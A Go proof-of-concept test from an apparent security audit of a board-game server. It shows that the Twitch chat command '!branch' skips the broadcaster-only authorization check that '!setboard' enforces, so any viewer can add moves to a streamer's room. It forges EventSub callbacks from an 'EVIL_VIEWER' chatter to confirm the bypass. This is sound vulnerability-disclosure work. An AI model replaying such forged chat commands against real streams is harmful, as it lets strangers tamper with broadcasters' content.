//go:build poc

// PoC for N-IN (integrations audit): the Twitch EventSub "!branch" chat command
// is missing the broadcaster==chatter authorization check that "!setboard" has.
// ANY chatter in the broadcaster's Twitch chat can graft arbitrary moves onto
// the broadcaster's mapped room. Run: go test -tags poc -run TestNINTwitchBranch -v ./pkg/hub/
package hub

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/golab/board/pkg/config"
	"github.com/golab/board/pkg/logx"
)

func TestNINTwitchBranchAuthz(t *testing.T) {
	h, err := NewHub(config.Test(), logx.NewDefaultLogger(logx.LogLevelError))
	if err != nil {
		t.Fatalf("hub: %v", err)
	}
	// broadcaster "B" maps their room
	if err := h.db.TwitchSetRoom("B", "streamroom"); err != nil {
		t.Fatalf("setroom: %v", err)
	}

	post := func(body string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(http.MethodPost, "/apps/twitch/callback", strings.NewReader(body))
		// config.Test() has an empty twitch secret, which only affects HOW the
		// message gets here (H-5); this PoC is about WHAT is authorized after
		// any valid chat message arrives.
		req.Header.Set("Twitch-Eventsub-Message-Id", "m1")
		req.Header.Set("Twitch-Eventsub-Message-Timestamp", "t1")
		rr := httptest.NewRecorder()
		h.twitchCallbackPost(rr, req)
		return rr
	}

	mk := func(broadcaster, chatter, text string) string {
		return `{"subscription":{"id":"s"},"event":{"broadcaster_user_id":"` + broadcaster +
			`","chatter_user_id":"` + chatter + `","message":{"text":"` + text + `"}}}`
	}

	// 1. control: a RANDOM chatter tries !setboard -> must be refused (broadcaster!=chatter)
	post(mk("B", "EVIL_VIEWER", "!setboard hijackedroom"))
	if got := h.db.TwitchGetRoom("B"); got != "streamroom" {
		t.Fatalf("control failed: setboard by non-broadcaster changed the room to %q", got)
	}
	t.Logf("control OK: !setboard from a non-broadcaster chatter is refused (broadcaster==chatter gate)")

	// 2. a RANDOM chatter issues !branch -> there is NO such gate
	r0 := h.GetOrCreateRoom("streamroom")
	n0 := len(r0.GetState().Nodes())
	post(mk("B", "EVIL_VIEWER", "!branch d4"))
	r1, _ := h.GetRoom("streamroom")
	n1 := len(r1.GetState().Nodes())
	t.Logf("nodes before/after a random chatter's !branch: %d -> %d", n0, n1)
	if n1 > n0 {
		t.Logf("N-IN twitch-branch CONFIRMED: any chatter (chatter_user_id != broadcaster_user_id)")
		t.Logf("    can graft moves onto the broadcaster's room; only !setboard checks broadcaster==chatter.")
	} else {
		t.Fatalf("branch had no effect (unexpected)")
	}
}
